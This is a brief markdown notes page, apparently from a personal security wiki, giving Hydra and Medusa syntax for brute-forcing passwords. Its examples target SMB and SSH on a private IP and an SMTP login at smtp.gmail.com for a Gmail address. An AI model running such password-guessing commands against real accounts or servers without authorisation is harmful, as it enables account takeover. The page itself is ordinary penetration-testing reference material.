---
layout: default
title: Cracking 
parent: security stuff
#has_children: true
nav_order: 2
---

1. TOC
{:toc}


## Hdyra
```bash
# basic syntax
hydra -l <username> -P <wordlist> <target> <service>

# attacking smb server
hydra -l john -P wordlist.txt smb://192.168.1.50

# attacking email server
hydra -l john@gmail.com -P wordlist.txt -S 565 smtp.gmail.com smtp
```

## Medusa
Medusa can be used against the following services: 
- FTP , HTTP, SSH, TELNET, SMTP, SMB, VNC

```bash
# basic syntax
medusa -h <target> -u <username> -P <wordlist> -M <module-name>

# attacking ssh server
medusa -h 192.168.1.50 -u john -P wordlist.txt -M ssh
```


---

## Resources and More
{: .no_toc }
### Links
{: .no_toc }
#### Reference
{: .no_toc }


